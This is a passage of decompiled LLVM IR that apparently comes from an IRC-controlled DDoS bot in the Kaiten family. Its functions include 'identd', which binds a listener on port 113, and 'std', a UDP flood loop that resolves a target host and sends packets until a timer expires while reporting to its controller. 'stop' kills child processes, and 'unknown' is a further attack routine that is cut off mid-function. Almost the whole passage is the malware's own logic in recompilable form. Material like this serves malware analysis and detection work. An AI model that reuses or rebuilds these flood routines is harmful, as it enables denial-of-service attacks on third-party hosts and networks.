  %v3_10000b38 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_100159fc.29 to i32), i32 ptrtoint (i32* @global_var_10015a0c.30 to i32))
  %v3_10000b48 = icmp eq i32 %v3_10000b38, 0
  br i1 %v3_10000b48, label %dec_label_pc_10000bc0.preheader, label %dec_label_pc_10000bd4

dec_label_pc_10000bc0.preheader:                  ; preds = %entry
  %v2_10000bc88 = icmp sgt i32 %v2_10000acc, -4
  br i1 %v2_10000bc88, label %dec_label_pc_10000b5c, label %dec_label_pc_10000cc4

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000bc0.preheader, %dec_label_pc_10000b5c
  %storemerge711 = phi i32 [ %v1_10000bb8, %dec_label_pc_10000b5c ], [ 0, %dec_label_pc_10000bc0.preheader ]
  store i32 268438384, i32* @lr, align 4
  %v0_10000b6c = call i32 @random()
  %v2_10000b88 = srem i32 %v0_10000b6c, 26
  %fold = add nsw i32 %v2_10000b88, 65
  %v1_10000bb0 = trunc i32 %fold to i8
  %v2_10000bb0 = load i32, i32* @r29, align 4
  %v3_10000bb0 = inttoptr i32 %v2_10000bb0 to i8*
  store i8 %v1_10000bb0, i8* %v3_10000bb0, align 1
  %v1_10000bb8 = add nuw nsw i32 %storemerge711, 1
  %v2_10000bc8 = icmp slt i32 %v1_10000bb8, %v1_10000ae8
  br i1 %v2_10000bc8, label %dec_label_pc_10000b5c, label %dec_label_pc_10000cc4

dec_label_pc_10000bd4:                            ; preds = %entry
  store i32 268438488, i32* @lr, align 4
  %v0_10000bd4 = call i32 @random()
  store i32 268438496, i32* @lr, align 4
  %v0_10000bdc = call i32 @random()
  %v0_10000be4 = load i32, i32* @r29, align 4
  %v2_10000be4 = mul i32 %v0_10000be4, %v0_10000bdc
  %v2_10000c00 = srem i32 %v2_10000be4, 45402
  %v2_10000c6012 = icmp sgt i32 %v2_10000c00, -1
  %v2_10000c38 = ptrtoint i32* %stack_var_-1072 to i32
  br i1 %v2_10000c6012, label %dec_label_pc_10000c38, label %dec_label_pc_10000c68

dec_label_pc_10000c38:                            ; preds = %dec_label_pc_10000bd4, %dec_label_pc_10000c38
  %storemerge615 = phi i32 [ %v1_10000c50, %dec_label_pc_10000c38 ], [ 0, %dec_label_pc_10000bd4 ]
  store i32 268438604, i32* @lr, align 4
  %v3_10000c48 = call i32 @fgets(i32 %v2_10000c38, i32 1024, i32 %v3_10000b38)
  %v1_10000c50 = add nuw nsw i32 %storemerge615, 1
  %v2_10000c60 = icmp slt i32 %storemerge615, %v2_10000c00
  br i1 %v2_10000c60, label %dec_label_pc_10000c38, label %dec_label_pc_10000c68

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c38, %dec_label_pc_10000bd4
  store i32 268438656, i32* @lr, align 4
  %v3_10000c7c = call i32 @__GI_memset(i32 %v2_10000c38, i32 0, i32 1024)
  store i32 268438676, i32* @lr, align 4
  %v3_10000c90 = call i32 @fgets(i32 %v2_10000c38, i32 1024, i32 %v3_10000b38)
  store i32 268438688, i32* @lr, align 4
  %v1_10000c9c = call i32 @filter(i32 %v2_10000c38)
  store i32 %v0_10000afc, i32* @r3, align 4
  store i32 %v2_10000c38, i32* @r4, align 4
  store i32 %v1_10000ae8, i32* @r5, align 4
  store i32 268438716, i32* @lr, align 4
  %v0_10000cb8 = call i32 @memcpy()
  store i32 268438724, i32* @lr, align 4
  %v1_10000cc0 = inttoptr i32 %v3_10000b38 to i16*
  %v2_10000cc0 = call i32 @__GI_fclose(i16* %v1_10000cc0)
  br label %dec_label_pc_10000cc4

dec_label_pc_10000cc4:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000bc0.preheader, %dec_label_pc_10000c68
  ret i32 %v0_10000afc

; uselistorder directives
  uselistorder i32 %v1_10000bb8, { 1, 0 }
  uselistorder i32 %v0_10000afc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000c38, { 1, 0 }
  uselistorder label %dec_label_pc_10000b5c, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  store i32 268438796, i32* @lr, align 4
  %v3_10000d08 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000d1c = icmp eq i32 %v3_10000d08, -1
  br i1 %v4_10000d1c, label %dec_label_pc_10001044, label %dec_label_pc_10000d24

dec_label_pc_10000d24:                            ; preds = %entry
  store i32 113, i32* @r3, align 4
  %v1_10000d30 = call i32 @htons(i32 113)
  store i32 %v3_10000d08, i32* @r3, align 4
  store i32 268438896, i32* @lr, align 4
  %v0_10000d6c = call i32 @bind()
  %v4_10000d78 = icmp eq i32 %v0_10000d6c, -1
  br i1 %v4_10000d78, label %dec_label_pc_10001044, label %dec_label_pc_10000d80

dec_label_pc_10000d80:                            ; preds = %dec_label_pc_10000d24
  store i32 268438924, i32* @lr, align 4
  %v3_10000d88 = call i32 @listen(i32 %v3_10000d08, i32 1, i32 %v0_10000d6c)
  %v4_10000d94 = icmp eq i32 %v3_10000d88, -1
  br i1 %v4_10000d94, label %dec_label_pc_10001044, label %dec_label_pc_10000d9c

dec_label_pc_10000d9c:                            ; preds = %dec_label_pc_10000d80
  store i32 268438944, i32* @lr, align 4
  %v0_10000d9c = call i32 @fork()
  %v3_10000da4 = icmp eq i32 %v0_10000d9c, 0
  br i1 %v3_10000da4, label %dec_label_pc_10001044, label %dec_label_pc_10000dac

dec_label_pc_10000dac:                            ; preds = %dec_label_pc_10000d9c
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000db4 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000db8 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438988, i32* @lr, align 4
  %v4_10000dc8 = call i32 @accept(i32 %v3_10000d08, i32 %v2_10000db4, i32 %v2_10000db8, i32 %v2_10000db8)
  %v4_10000ddc = icmp eq i32 %v4_10000dc8, -1
  br i1 %v4_10000ddc, label %dec_label_pc_10000de4, label %dec_label_pc_10000dec.preheader

dec_label_pc_10000de4:                            ; preds = %dec_label_pc_10000dac
  %v0_10000de8 = call i32 @__GI_exit()
  br label %dec_label_pc_10000dec.preheader

dec_label_pc_10000dec.preheader:                  ; preds = %dec_label_pc_10000de4, %dec_label_pc_10000dac
  %v2_10000dec = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000e34 = udiv i32 %v4_10000dc8, 32
  %v1_10000e3c = mul nuw nsw i32 %v1_10000e34, 4
  %v2_10000e40 = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000e44 = add i32 %v2_10000e40, 1092
  %v1_10000e48 = add i32 %v2_10000e44, %v1_10000e3c
  %v1_10000e4c = inttoptr i32 %v1_10000e48 to i32*
  %v1_10000e54 = urem i32 %v4_10000dc8, 32
  %v3_10000e5c = shl i32 1, %v1_10000e54
  %v1_10000e8c = add i32 %v4_10000dc8, 1
  %v2_10000e94 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000ee8 = sub i32 0, %v4_10000dc8
  %v4_10000ee8 = urem i32 %v3_10000ee8, 32
  %v6_10000ee8 = xor i32 %v4_10000ee8, 31
  %v12_10000ee8 = lshr i32 -1, %v1_10000e54
  %v16_10000ee8 = xor i32 %v12_10000ee8, 1
  %v14_10000ee8 = urem i32 %v12_10000ee8, 2
  br label %dec_label_pc_10000dec

dec_label_pc_10000dec:                            ; preds = %dec_label_pc_10000dec.preheader, %dec_label_pc_10000ec4
  store i32 %v2_10000dec, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge

dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge: ; preds = %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge.dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge_crit_edge, %dec_label_pc_10000dec
  %v3_10000e04.pre = phi i32 [ %v2_10000dec, %dec_label_pc_10000dec ], [ %v3_10000e04.pre.pre, %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge.dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge_crit_edge ]
  %v1_10000e1c30 = phi i32 [ 1, %dec_label_pc_10000dec ], [ %v1_10000e1c, %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge.dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge_crit_edge ]
  %v1_10000e08 = mul nuw nsw i32 %v1_10000e1c30, 4
  %v2_10000e0c = add i32 %v1_10000e08, %v3_10000e04.pre
  %v2_10000e14 = inttoptr i32 %v2_10000e0c to i32*
  store i32 0, i32* %v2_10000e14, align 4
  %v1_10000e1c = add nuw nsw i32 %v1_10000e1c30, 1
  %tmp25 = icmp ult i32 %v1_10000e1c, 32
  br i1 %tmp25, label %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge.dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge_crit_edge, label %dec_label_pc_10000e30

dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge.dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge_crit_edge: ; preds = %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge
  %v3_10000e04.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge

dec_label_pc_10000e30:                            ; preds = %dec_label_pc_10000e00.dec_label_pc_10000e00_crit_edge
  %v2_10000e4c = load i32, i32* %v1_10000e4c, align 4
  %v2_10000e60 = or i32 %v2_10000e4c, %v3_10000e5c
  store i32 %v2_10000e60, i32* %v1_10000e4c, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268439216, i32* @lr, align 4
  %v6_10000eac = call i32 @__libc_select(i32 %v1_10000e8c, i32 %v2_10000dec, i32 0, i32 0, i32 %v2_10000e94, i32 %v2_10000dec)
  %tmp26 = icmp sgt i32 %v6_10000eac, -1
  br i1 %tmp26, label %dec_label_pc_10000ec4, label %dec_label_pc_10000ebc

dec_label_pc_10000ebc:                            ; preds = %dec_label_pc_10000e30
  %v0_10000ec0 = call i32 @__GI_exit()
  br label %dec_label_pc_10000ec4

dec_label_pc_10000ec4:                            ; preds = %dec_label_pc_10000e30, %dec_label_pc_10000ebc
  %v2_10000edc = load i32, i32* %v1_10000e4c, align 4
  %v5_10000ee8 = shl i32 %v2_10000edc, %v4_10000ee8
  %v7_10000ee8 = lshr i32 %v2_10000edc, %v6_10000ee8
  %v8_10000ee8 = udiv i32 %v7_10000ee8, 2
  %v9_10000ee8 = or i32 %v8_10000ee8, %v5_10000ee8
  %tmp = icmp slt i32 %v2_10000edc, 0
  %v15_10000ee82 = zext i1 %tmp to i32
  %v17_10000ee8 = and i32 %v15_10000ee82, %v16_10000ee8
  %v14_10000ee8.masked = and i32 %v14_10000ee8, %v9_10000ee8
  %v1_10000ef0 = or i32 %v14_10000ee8.masked, %v17_10000ee8
  %v3_10000ef4 = icmp eq i32 %v1_10000ef0, 0
  br i1 %v3_10000ef4, label %dec_label_pc_10000dec, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000ec4
  %v2_10000f00 = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268439320, i32* @lr, align 4
  %v5_10000f14 = call i32 @recv(i32 %v4_10000dc8, i32 %v2_10000f00, i32 1024, i32 0, i32 %v2_10000edc)
  %tmp27 = icmp slt i32 %v5_10000f14, 1
  br i1 %tmp27, label %dec_label_pc_10000f38, label %dec_label_pc_10000f2c

dec_label_pc_10000f2c:                            ; preds = %dec_label_pc_10000f00
  %tmp28 = icmp slt i32 %v5_10000f14, 20
  br i1 %tmp28, label %dec_label_pc_10000f40, label %dec_label_pc_10000f38

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000f2c, %dec_label_pc_10000f00
  %v0_10000f3c = call i32 @__GI_exit()
  br label %dec_label_pc_10000f40

dec_label_pc_10000f40:                            ; preds = %dec_label_pc_10000f2c, %dec_label_pc_10000f38
  %v2_10000f48 = add i32 %v2_10000e40, 60
  %v3_10000f50 = add i32 %v2_10000f48, %v5_10000f14
  %v4_10000f50 = inttoptr i32 %v3_10000f50 to i8*
  store i8 0, i8* %v4_10000f50, align 1
  %v1_10000f58 = add i32 %v2_10000e40, -1
  %v2_10000f60 = add i32 %v1_10000f58, %v5_10000f14
  %v1_10000f64 = add i32 %v2_10000f60, 60
  %v2_10000f64 = inttoptr i32 %v1_10000f64 to i8*
  %v3_10000f64 = load i8, i8* %v2_10000f64, align 1
  %v3_10000f6c = icmp eq i8 %v3_10000f64, 10
  br i1 %v3_10000f6c, label %dec_label_pc_10000f94, label %dec_label_pc_10000f74

dec_label_pc_10000f74:                            ; preds = %dec_label_pc_10000f40
  %v3_10000f84 = load i8, i8* %v2_10000f64, align 1
  %v3_10000f8c = icmp eq i8 %v3_10000f84, 13
  br i1 %v3_10000f8c, label %dec_label_pc_10000f94, label %dec_label_pc_10000fac

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000f74, %dec_label_pc_10000f40
  store i8 0, i8* %v2_10000f64, align 1
  br label %dec_label_pc_10000fac

dec_label_pc_10000fac:                            ; preds = %dec_label_pc_10000f74, %dec_label_pc_10000f94
  %v1_10000fb0 = add i32 %v2_10000e40, -2
  %v2_10000fb8 = add i32 %v1_10000fb0, %v5_10000f14
  %v1_10000fbc = add i32 %v2_10000fb8, 60
  %v2_10000fbc = inttoptr i32 %v1_10000fbc to i8*
  %v3_10000fbc = load i8, i8* %v2_10000fbc, align 1
  %v3_10000fc4 = icmp eq i8 %v3_10000fbc, 10
  br i1 %v3_10000fc4, label %dec_label_pc_10000fec, label %dec_label_pc_10000fcc

dec_label_pc_10000fcc:                            ; preds = %dec_label_pc_10000fac
  %v3_10000fdc = load i8, i8* %v2_10000fbc, align 1
  %v3_10000fe4 = icmp eq i8 %v3_10000fdc, 13
  br i1 %v3_10000fe4, label %dec_label_pc_10000fec, label %dec_label_pc_10001004

dec_label_pc_10000fec:                            ; preds = %dec_label_pc_10000fcc, %dec_label_pc_10000fac
  store i8 0, i8* %v2_10000fbc, align 1
  br label %dec_label_pc_10001004

dec_label_pc_10001004:                            ; preds = %dec_label_pc_10000fcc, %dec_label_pc_10000fec
  %v3_10001008 = load i32, i32* @global_var_1002c2f4.31, align 4
  %v6_10001028 = call i32 @Send(i32 %v4_10000dc8, i32 ptrtoint ([25 x i8]* @global_var_10015a10.32 to i32), i32 %v2_10000f00, i32 %v3_10001008, i32 268500992)
  store i32 268439604, i32* @lr, align 4
  %v1_10001030 = call i32 @close(i32 %v4_10000dc8)
  store i32 ptrtoint ([3 x i8]* @global_var_1000103c.33 to i32), i32* @lr, align 4
  %v1_10001038 = call i32 @close(i32 %v3_10000d08)
  %v0_10001040 = call i32 @__GI_exit()
  br label %dec_label_pc_10001044

dec_label_pc_10001044:                            ; preds = %dec_label_pc_10000d9c, %dec_label_pc_10000d80, %dec_label_pc_10000d24, %entry, %dec_label_pc_10001004
  %v0_10001058 = phi i32 [ 0, %dec_label_pc_10000d9c ], [ -1, %dec_label_pc_10000d80 ], [ -1, %dec_label_pc_10000d24 ], [ -1, %entry ], [ %v0_10001040, %dec_label_pc_10001004 ]
  ret i32 %v0_10001058

; uselistorder directives
  uselistorder i8* %v2_10000fbc, { 1, 0, 2 }
  uselistorder i8* %v2_10000f64, { 1, 0, 2 }
  uselistorder i32 %v5_10000f14, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000edc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10000e1c, { 1, 0 }
  uselistorder i32 %v1_10000e54, { 1, 0 }
  uselistorder i32* %v1_10000e4c, { 1, 0, 2 }
  uselistorder i32 %v2_10000dec, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000dc8, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10001044, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10001004, { 1, 0 }
  uselistorder label %dec_label_pc_10000fac, { 1, 0 }
  uselistorder label %dec_label_pc_10000f40, { 1, 0 }
  uselistorder label %dec_label_pc_10000ec4, { 1, 0 }
  uselistorder label %dec_label_pc_10000dec, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_10001084 = icmp sgt i32 %arg3, 2
  br i1 %v2_10001084, label %dec_label_pc_100010b4, label %dec_label_pc_1000108c

dec_label_pc_1000108c:                            ; preds = %entry
  %v3_10001090 = load i32, i32* @global_var_1002c314.34, align 4
  %v5_100010a8 = load i32, i32* @r7, align 4
  %v6_100010a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_10015a2c.35 to i32), i32 %v3_10001090, i32 268500992, i32 %v5_100010a8)
  %v0_100010b0 = call i32 @__GI_exit()
  br label %dec_label_pc_100010b4

dec_label_pc_100010b4:                            ; preds = %entry, %dec_label_pc_1000108c
  store i32 268439748, i32* @lr, align 4
  %v3_100010c0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268439764, i32* @lr, align 4
  %v1_100010d0 = call i32 @__GI_time(i32 0)
  %v1_100010e0 = add i32 %arg4, 12
  %v1_100010e4 = inttoptr i32 %v1_100010e0 to i32*
  %v2_100010e4 = load i32, i32* %v1_100010e4, align 4
  store i32 268439792, i32* @lr, align 4
  %v2_100010ec = call i32 @atol(i32 %v2_100010e4, i32 %v1_100010e0)
  %v1_100010fc = call i32 @mfork(i32 %arg2)
  %v3_10001104 = icmp eq i32 %v1_100010fc, 0
  br i1 %v3_10001104, label %dec_label_pc_1000110c, label %dec_label_pc_10001294

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010b4
  %v3_10001110 = load i32, i32* @global_var_1002c314.34, align 4
  %v1_10001118 = add i32 %arg4, 4
  %v1_1000111c = inttoptr i32 %v1_10001118 to i32*
  %v2_1000111c = load i32, i32* %v1_1000111c, align 4
  %v6_10001138 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_10015a5c.38 to i32), i32 %v3_10001110, i32 %v2_1000111c, i32 268500992)
  %v2_10001144 = load i32, i32* %v1_1000111c, align 4
  store i32 268439888, i32* @lr, align 4
  %v2_1000114c = call i32 @__GI_gethostbyname(i32 %v2_10001144, i32 %v1_10001118)
  %v2_10001158 = ptrtoint i32* %stack_var_-52 to i32
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v1_10001180 = add i32 %v2_1000114c, 16
  %v2_10001180 = inttoptr i32 %v1_10001180 to i32*
  %v3_10001180 = load i32, i32* %v2_10001180, align 4
  %v1_10001184 = inttoptr i32 %v3_10001180 to i32*
  %v2_10001184 = load i32, i32* %v1_10001184, align 4
  %v2_1000118c = ptrtoint i32* %stack_var_-48 to i32
  %v1_10001194 = add i32 %v2_1000114c, 12
  %v2_10001194 = inttoptr i32 %v1_10001194 to i32*
  %v3_10001194 = load i32, i32* %v2_10001194, align 4
  store i32 %v3_10001194, i32* @r5, align 4
  store i32 268439976, i32* @lr, align 4
  %v4_100011a4 = call i32 @bcopy(i32 %v2_10001184, i32 %v2_1000118c, i32 %v3_10001194, i32 %v2_1000114c)
  %v1_100011ac = add i32 %v2_1000114c, 8
  %v2_100011ac = inttoptr i32 %v1_100011ac to i32*
  %v3_100011ac = load i32, i32* %v2_100011ac, align 4
  %v1_100011b0 = urem i32 %v3_100011ac, 65536
  store i32 %v1_100011b0, i32* %stack_var_-52, align 4
  %v1_100011bc = add i32 %arg4, 8
  %v1_100011c0 = inttoptr i32 %v1_100011bc to i32*
  %v2_100011c0 = load i32, i32* %v1_100011c0, align 4
  store i32 268440012, i32* @lr, align 4
  %v2_100011c8 = call i32 @atol(i32 %v2_100011c0, i32 %v1_100011bc)
  %v2_10001230 = add i32 %v2_100010ec, %v1_100010d0
  br label %dec_label_pc_100011e0

dec_label_pc_100011e0:                            ; preds = %dec_label_pc_10001284, %dec_label_pc_1000110c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000110c ], [ %v1_10001288, %dec_label_pc_10001284 ]
  %tmp19 = icmp ult i32 %storemerge1, 50
  br i1 %tmp19, label %dec_label_pc_10001284, label %dec_label_pc_100011ec

dec_label_pc_100011ec:                            ; preds = %dec_label_pc_100011e0
  store i32 268440068, i32* @lr, align 4
  %v6_10001200 = call i32 @send(i32 %v3_100010c0, i32 ptrtoint ([4 x i8]* @global_var_10015a7c.39 to i32), i32 50, i32 0, i32 268500992)
  store i32 ptrtoint ([3 x i8]* @global_var_10001218.40 to i32), i32* @lr, align 4
  %v3_10001214 = call i32 @connect(i32 %v3_100010c0, i32 %v2_10001158, i32 16)
  store i32 268440096, i32* @lr, align 4
  %v1_1000121c = call i32 @__GI_time(i32 0)
  %v2_10001234 = icmp ult i32 %v1_1000121c, %v2_10001230
  br i1 %v2_10001234, label %dec_label_pc_1000127c, label %dec_label_pc_1000123c

dec_label_pc_1000123c:                            ; preds = %dec_label_pc_100011ec
  %v3_10001240 = load i32, i32* @global_var_1002c314.34, align 4
  %v2_1000124c = load i32, i32* %v1_1000111c, align 4
  %v6_10001268 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_10015a80.41 to i32), i32 %v3_10001240, i32 %v2_1000124c, i32 268500992)
  store i32 ptrtoint ([3 x i8]* @global_var_10001274.42 to i32), i32* @lr, align 4
  %v1_10001270 = call i32 @close(i32 %v3_100010c0)
  %v0_10001278 = call i32 @__GI_exit()
  br label %dec_label_pc_1000127c

dec_label_pc_1000127c:                            ; preds = %dec_label_pc_100011ec, %dec_label_pc_1000123c
  br label %dec_label_pc_10001284

dec_label_pc_10001284:                            ; preds = %dec_label_pc_100011e0, %dec_label_pc_1000127c
  %stack_var_-72.0 = phi i32 [ %storemerge1, %dec_label_pc_100011e0 ], [ 0, %dec_label_pc_1000127c ]
  %v1_10001288 = add i32 %stack_var_-72.0, 1
  br label %dec_label_pc_100011e0

dec_label_pc_10001294:                            ; preds = %dec_label_pc_100010b4
  ret i32 %v1_100010fc

; uselistorder directives
  uselistorder i32 %v3_10001194, { 1, 0 }
  uselistorder i32 %v2_1000114c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001284, { 1, 0 }
  uselistorder label %dec_label_pc_1000127c, { 1, 0 }
  uselistorder label %dec_label_pc_100010b4, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_100012c4 = load i32, i32* %r3.global-to-local, align 4
  %v3_100013b42 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_100013bc3 = icmp eq i32 %v3_100013b42, 0
  br i1 %v2_100013bc3, label %dec_label_pc_100013c4, label %dec_label_pc_100012e0.lr.ph

dec_label_pc_100012e0.lr.ph:                      ; preds = %entry
  %v3_10001334 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_100012e0

dec_label_pc_100012e0:                            ; preds = %dec_label_pc_100012e0.lr.ph, %dec_label_pc_100013a4
  %v0_100013dc9 = phi i32 [ %v0_100012c4, %dec_label_pc_100012e0.lr.ph ], [ %v0_100013dc8, %dec_label_pc_100013a4 ]
  %storemerge15 = phi i32 [ 0, %dec_label_pc_100012e0.lr.ph ], [ %v1_100013a8, %dec_label_pc_100013a4 ]
  %v1_100012e4 = mul i32 %storemerge15, 4
  %v3_100012f0 = load i32, i32* @global_var_1002c318.28, align 4
  %v2_100012f4 = add i32 %v3_100012f0, %v1_100012e4
  %v1_100012f8 = inttoptr i32 %v2_100012f4 to i32*
  %v2_100012f8 = load i32, i32* %v1_100012f8, align 4
  %v3_100012fc = icmp eq i32 %v2_100012f8, 0
  br i1 %v3_100012fc, label %dec_label_pc_100013a4, label %dec_label_pc_10001304

dec_label_pc_10001304:                            ; preds = %dec_label_pc_100012e0
  %v2_1000131c = load i32, i32* %v1_100012f8, align 4
  store i32 268440356, i32* @lr, align 4
  %v0_10001320 = call i32 @__libc_getpid()
  store i32 %v0_10001320, i32* %r3.global-to-local, align 4
  %v4_10001328 = icmp eq i32 %v2_1000131c, %v0_10001320
  br i1 %v4_10001328, label %dec_label_pc_100013a4, label %dec_label_pc_10001330

dec_label_pc_10001330:                            ; preds = %dec_label_pc_10001304
  br i1 %v3_10001334, label %dec_label_pc_1000137c, label %dec_label_pc_1000133c

dec_label_pc_1000133c:                            ; preds = %dec_label_pc_10001330
  %v3_10001340 = load i32, i32* @global_var_1002c314.34, align 4
  %v3_10001354 = load i32, i32* @global_var_1002c318.28, align 4
  %v2_10001358 = add i32 %v3_10001354, %v1_100012e4
  %v1_1000135c = inttoptr i32 %v2_10001358 to i32*
  %v2_1000135c = load i32, i32* %v1_1000135c, align 4
  store i32 %v0_100012c4, i32* %r3.global-to-local, align 4
  %v6_10001378 = call i32 @Send(i32 %v0_100012c4, i32 ptrtoint ([29 x i8]* @global_var_10015aa4.44 to i32), i32 %v3_10001340, i32 %v2_1000135c, i32 268500992)
  store i32 %v6_10001378, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000137c

dec_label_pc_1000137c:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000133c
  %v3_1000138c = load i32, i32* @global_var_1002c318.28, align 4
  %v2_10001390 = add i32 %v3_1000138c, %v1_100012e4
  %v1_10001394 = inttoptr i32 %v2_10001390 to i32*
  %v2_10001394 = load i32, i32* %v1_10001394, align 4
  store i32 %v2_10001394, i32* %r3.global-to-local, align 4
  store i32 268440484, i32* @lr, align 4
  %v2_100013a0 = call i32 @kill(i32 %v2_10001394, i32 9)
  store i32 %v2_100013a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100013a4

dec_label_pc_100013a4:                            ; preds = %dec_label_pc_10001304, %dec_label_pc_100012e0, %dec_label_pc_1000137c
  %v0_100013dc8 = phi i32 [ %v0_10001320, %dec_label_pc_10001304 ], [ %v0_100013dc9, %dec_label_pc_100012e0 ], [ %v2_100013a0, %dec_label_pc_1000137c ]
  %v1_100013a8 = add i32 %storemerge15, 1
  %v3_100013b4 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_100013bc = icmp ult i32 %v1_100013a8, %v3_100013b4
  br i1 %v2_100013bc, label %dec_label_pc_100012e0, label %dec_label_pc_100013b0.dec_label_pc_100013c4_crit_edge

dec_label_pc_100013b0.dec_label_pc_100013c4_crit_edge: ; preds = %dec_label_pc_100013a4
  br label %dec_label_pc_100013c4

dec_label_pc_100013c4:                            ; preds = %entry, %dec_label_pc_100013b0.dec_label_pc_100013c4_crit_edge
  %v0_100013dc = phi i32 [ %v0_100013dc8, %dec_label_pc_100013b0.dec_label_pc_100013c4_crit_edge ], [ %v0_100012c4, %entry ]
  ret i32 %v0_100013dc

; uselistorder directives
  uselistorder i32 %v1_100012e4, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v0_100012c4, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 3, 4, 5, 2, 0, 1 }
  uselistorder label %dec_label_pc_100013c4, { 1, 0 }
  uselistorder label %dec_label_pc_100013a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000137c, { 1, 0 }
  uselistorder label %dec_label_pc_100012e0, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 1, i32* %stack_var_-48, align 4
  store i32 9216, i32* @r3, align 4
  store i32 268440596, i32* @lr, align 4
  %v0_10001410 = call i32 @malloc()
  store i32 268440612, i32* @lr, align 4
  %v1_10001420 = call i32 @__GI_time(i32 0)
  %v1_10001430 = call i32 @mfork(i32 %arg2)
  %v3_10001438 = icmp eq i32 %v1_10001430, 0
  br i1 %v3_10001438, label %dec_label_pc_10001440, label %dec_label_pc_10001614

dec_label_pc_10001440:                            ; preds = %entry
  %v3_10001444 = icmp eq i32 %arg3, 2
  br i1 %v3_10001444, label %dec_label_pc_10001474, label %dec_label_pc_1000144c

dec_label_pc_1000144c:                            ; preds = %dec_label_pc_10001440
  %v3_10001450 = load i32, i32* @global_var_1002c314.34, align 4
  %v5_10001468 = load i32, i32* @r7, align 4
  %v6_10001468 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_10015ac4.45 to i32), i32 %v3_10001450, i32 268500992, i32 %v5_10001468)
  %v0_10001470 = call i32 @__GI_exit()
  br label %dec_label_pc_10001474

dec_label_pc_10001474:                            ; preds = %dec_label_pc_10001440, %dec_label_pc_1000144c
  %v1_10001478 = add i32 %arg4, 8
  %v1_1000147c = inttoptr i32 %v1_10001478 to i32*
  %v2_1000147c = load i32, i32* %v1_1000147c, align 4
  store i32 268440712, i32* @lr, align 4
  %v2_10001484 = call i32 @atol(i32 %v2_1000147c, i32 %v1_10001478)
  %v2_10001490 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
